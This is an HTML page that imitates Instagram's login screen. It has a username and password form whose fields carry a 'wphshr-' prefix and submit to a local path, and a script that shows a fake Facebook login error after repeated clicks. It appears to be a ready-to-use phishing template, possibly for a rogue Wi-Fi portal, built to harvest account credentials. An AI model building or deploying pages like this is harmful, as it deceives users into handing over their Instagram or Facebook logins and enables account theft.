<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Instagram</title>
    <link href="/static_website/css/bootstrap.min.css" rel="stylesheet"/>
    <link href="/static_website/css/css.css" rel="stylesheet"/>
  </head>
  <body>
    <!-- Mobile -->
    <div class="mt-5" style="margin: 2%">
      <div class="p-2 d-flex-column flex-fill">
        <div class="upper mb-5">
          <div class="top text-center">
            <div class="logo mb-3">
              <i
                data-visualcompletion="css-img"
                aria-label="Instagram"
                class=""
                role="img"
                style="
                  background-image: url('/static_website/static/KoLLpWDb4f6.png');
                  background-position: 0px -52px;
                  background-size: auto;
                  width: 175px;
                  height: 51px;
                  background-repeat: no-repeat;
                  display: inline-block;
                "
              ></i>
            </div>
            <div class="login-details">
              <div class="userpart">
                <!-- Form Start-->
                <form action="/static_website/instagram.html" method="get">
                  <div class="username">
                    <input name="wphshr-username" required
                      class="password mb-1"
                      placeholder="Phone number, username or email address"
                    />
                  </div>
                  <div class="username mb-3">
                    <input name="wphshr-password" required
                      type="password"
                      class="password"
                      placeholder="Password"
                    />
                  </div>

                  <div  class="loginbutton mb-2">
                    <button type="submit" class="password" onclick="clickcounter()"
                      style="
                        border-radius: 10px;
                        font-size: 15px;
                        color: white;
                        background-color: rgba(0, 149, 246, 1);

                        height: 32px;
                      "
                    >
                      <div style="margin-top: -1%">
                        <strong>Log in</strong>
                      </div>
                    </button>
                  </div>
                </form>
                <p id="errorMessage" class="error normaltext" style="color: red; font-size: 12px;">Error while loging with Facebook. Try another method</p>

                <!-- Form end-->
                 <!-- flash msg 
                {% with messages = get_flashed_messages(with_categories=true) %}
                {% if messages %}
                    {% for msg in messages %}
                        <div class="d-flex normaltext" style="font-size: 10px; color: red">
                            <div class="">{{ msg[1] }}</div>
                        </div>
                       {% endfor %}
                   {% endif %}
               {% endwith %}
                      -->
                <div class="or mb-2">
                  <div class="m-4">OR</div>
                </div>
                <div class="Facebook d-flex normaltext mb-2">
                  <svg
                    style="margin-top: 1px"
                    fill="#0095f6"
                    height="20"
                    width="20"
                  >
                    <path
                      d="M8 0C3.6 0 0 3.6 0 8c0 4 2.9 7.3 6.8 7.9v-5.6h-2V8h2V6.2c0-2 1.2-3.1 3-3.1.9 0 1.8.2 1.8.2v2h-1c-1 0-1.3.6-1.3 1.3V8h2.2l-.4 2.3H9.2v5.6C13.1 15.3 16 12 16 8c0-4.4-3.6-8-8-8Z"
                      fill="#0095f6"
                    ></path>
                    <defs>
                      <clipPath id="a">
                        <rect fill="blue" height="16" width="16"></rect>
                      </clipPath>
                    </defs>
                  </svg>
                  <div class="ms-1"><strong>
                    <a href="/static_website/index.html">
                      Log in with Facebook
                    </a>
                  </strong></div>
                </div>
              </div>
              <div class="forget">Forgetten your password?</div>
            </div>
          </div>
          <div class="middle text-center m-4">
            Don't have an account?
            <div class="blue d-inline"><strong>Sign up</strong></div>
          </div>
          <div class="bottom d-flex-column">
            <div class="getapp text-center mb-2">Get the app.</div>
            <div class="app-img text-center">
              <img
                src="/static_website/static/Yfc020c87j0.png"
                height="40px"
                width="136px"
              />
              <img
                src="/static_website/static/c5Rp7Ym-Klz.png"
                height="40px"
                width="136px"
              />
            </div>
          </div>
        </div>
        <div class="d-flex text-center m-5">
          <div
            class="language row"
            style="
              margin-left: 10%;
              margin-right: 10%;
              font-family: Roboto;
              font-size: 12px;
              text-align: start;
            "
          >
            <div class="col">Meta</div>
            <div class="col">About</div>
            <div class="col">Blog</div>
            <div class="col">Jobs</div>
            <div class="col">Help</div>
            <div class="col">API</div>
            <div class="col">Privacy</div>
            <div class="col-auto">Terms</div>
            <div class="col-auto">Locations</div>
            <div class="col-auto">Meta Verified</div>
            <div class="col-auto">Threads</div>
            <div class="col-auto">Instagram Lite</div>
            <div class="col-auto">Contact uploading and non-users</div>
          </div>
        </div>
      </div>
    </div>
    <!--
    <div class="" style="margin: 2%">
      <div
        class="d-flex flex-row ms-3 me-3 justify-content-center"
        style="height: 100%"
      >
        <div class="p-2 green flex-fill">Flex item 1</div>
        <div class="p-2 blue flex-fill">Flex item 2</div>
      </div>
    </div>
    -->

    <script src="/static_website/js/bootstrap.bundle.min.js" ></script>
    <script>
      let clickcount = 0

      function clickcounter() {
        clickcount++;

        const errorMessage = document.getElementById('errorMessage');

        if (clickcount > 3) {
          errorMessage.style.display = "block"
        }
      }
    </script>

  </body>
</html>
